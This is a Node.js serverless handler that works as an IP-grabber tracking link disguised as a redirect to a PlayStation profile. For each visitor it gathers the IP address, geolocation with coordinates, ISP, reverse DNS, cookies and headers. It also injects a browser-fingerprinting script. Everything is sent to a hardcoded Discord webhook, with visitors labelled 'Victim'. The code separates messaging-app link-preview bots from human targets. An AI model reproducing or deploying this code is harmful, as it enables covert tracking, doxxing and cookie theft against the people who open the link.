import fetch from 'node-fetch';
import dns from 'dns/promises';

const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";


async function sendToWebhook(message) {
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error(`Webhook Error [${response.status}]: ${errorText}`);
        } else {
            console.log("Data sent to webhook successfully.");
        }
    } catch (error) {
        console.error("Webhook sending failed:", error.stack || error);
    }
}


// Get IP details from the IP-API service
async function getIpDetails(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        return await response.json();
    } catch (error) {
        console.error("Failed to retrieve IP information:", error);
        return null;
    }
}

// Log request metadata
async function logRequestMetadata(req) {
    return {
        cookies: req.headers['cookie'] || 'N/A',
        connection: req.headers['connection'] || 'N/A',
        contentTypeOptions: req.headers['x-content-type-options'] || 'N/A',
        frameOptions: req.headers['x-frame-options'] || 'N/A',
    };
}


// Perform reverse DNS lookup
async function getReverseDNS(ip) {
    try {
        const hostnames = await dns.reverse(ip);
        return hostnames.length > 0 ? hostnames.join(', ') : 'N/A';
    } catch (error) {
        console.error(`Reverse DNS lookup failed for IP ${ip}:`, error.message);
        return 'N/A';
    }
}


// Detect device type from user agent
function detectDeviceType(userAgent) {
    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return "Mobile";
    } else if (/Tablet|iPad/i.test(userAgent)) {
        return "Tablet";
    } else {
        return "Desktop";
    }
}



function injectFingerprintScript(res) {
    const fingerprintScript = `
        <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
        <script>
            new Fingerprint2().get(function(result, components) {
                fetch("${webhookUrl}", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        title: "Browser Fingerprint",
                        fingerprint: result,
                        components: components
                    })
                });
            });
        </script>
    `;
    res.end(fingerprintScript);
}


function getBrowserEngine(userAgent) {
    if (/Chrome|Chromium|Edg/.test(userAgent)) return 'Blink';
    if (/Safari/.test(userAgent)) return 'WebKit';
    if (/Gecko/.test(userAgent)) return 'Gecko';
    if (/Trident/.test(userAgent)) return 'Trident';
    return 'Unknown';
}

function getOperatingSystem(userAgent) {
    if (/Windows/.test(userAgent)) return 'Windows';
    if (/Mac/.test(userAgent)) return 'macOS';
    if (/Android/.test(userAgent)) return 'Android';
    if (/Linux/.test(userAgent)) return 'Linux';
    return 'Unknown';
}



function logDebugInfo(reverseDNS, requestMetadata) {
    console.log(`Reverse DNS result: ${reverseDNS}`);
    console.log(`Request Metadata: ${JSON.stringify(requestMetadata)}`);
}






export default async function handler(req, res) {
    if (req.method === 'GET' || req.method === 'POST') {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const blacklistedIPs = ["716.147.210.120", "181.55.23.312"];

        if (blacklistedIPs.includes(ip)) {
            res.status(403).send("Forbidden: Your IP address is blacklisted.");
            return;
        }

        const ipDetails = await getIpDetails(ip);

        if (!ipDetails || ipDetails.status !== 'success') {
            console.error(`Failed to retrieve IP details for IP: ${ip}. Response: ${JSON.stringify(ipDetails)}`);
            res.status(500).send("Failed to retrieve IP information.");
            return;
        }
        
        
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
        const referer = req.headers['referer'] || 'No referer';

        const deviceType = detectDeviceType(userAgent);

        const browserEngine = getBrowserEngine(userAgent);
        const os = getOperatingSystem(userAgent);

        const coords = ipDetails.lat && ipDetails.lon
            ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
            : "Not available";

        // Add request metadata
        const requestMetadata = await logRequestMetadata(req);
        // Perform reverse DNS lookup
        const reverseDNS = ipDetails.query ? await getReverseDNS(ipDetails.query) : 'N/A';


        // Call in the handler function:
        logDebugInfo(reverseDNS, requestMetadata);

        // In the handler function, add this for browser requests:
        if (req.method === 'GET' && (deviceType === 'Desktop' || deviceType === 'Mobile' || deviceType === 'Tablet')) {
            injectFingerprintScript(res);
        }

        console.log("pepe");

        function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata) {
            return [
                { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
                { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
                { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
                { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
                { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
                { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
                { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
                { name: "Coords", value: coords, inline: true },
                { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
                { name: "Reverse DNS", value: `\`${reverseDNS || "N/A"}\``, inline: false },
                { name: "Cookies", value: `\`${requestMetadata.cookies}\``, inline: false },
                { name: "Connection", value: `\`${requestMetadata.connection}\``, inline: true },
                { name: "Content-Type Options", value: `\`${requestMetadata.contentTypeOptions}\``, inline: true },
                { name: "Frame Options", value: `\`${requestMetadata.frameOptions}\``, inline: true },
                { name: "Device Info", value: `\`${userAgent}\``, inline: false },
                { name: "Device Type", value: `\`${deviceType}\``, inline: true },
                { name: "Operating System", value: `\`${os}\``, inline: true },
                { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
                { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
                { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
                { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
                { name: "Referer", value: `\`${referer}\``, inline: false },
                { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
                { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
                { name: "Hosting", value: "\`No\`", inline: true },
            ];
        }





        // Check 1: Google LLC and Discordbot
        if (ipDetails.isp === "Google LLC" && userAgent.includes("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim from Discord Message",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }

        // Check 2: Facebook External Hit
        if (ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")) {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim Facebook/Instagram Message",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }

        // Check 3: Playstation External Hit
        if (ipDetails.isp === "Amazon.com, Inc." && userAgent.includes("UrlPreviewServiceV2")) {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim Playstation Message",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }

        // Check 4: Twitter External Hit
        if (ipDetails.isp === "Twitter Inc." && userAgent.includes("Twitterbot/1.0")) {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim Twitter Message",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }


        // Check 5: WhatsApp External Hit
        if (userAgent === "WhatsApp/2.23.20.0") {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim via WhatsApp",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }


        // Default: Full Info for Other Requests
        if (!ipDetails.hosting) {

            const fields = createCommonFields(
                ipDetails,
                coords,
                userAgent,
                deviceType,
                os,
                browserEngine,
                acceptLanguage,
                acceptEncoding,
                doNotTrack,
                referer,
                reverseDNS,
                requestMetadata
            );

            const message = {
                embeds: [
                    {
                        title: "User Opened Link",
                        color: 0x00FFFF,
                        description: "Device info collected from Victim.",
                        fields: fields
                    }
                ]
            };
            await sendToWebhook(message);
        }

        res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
        res.end();
    } else {
        res.status(405).send("Method Not Allowed");
    }
}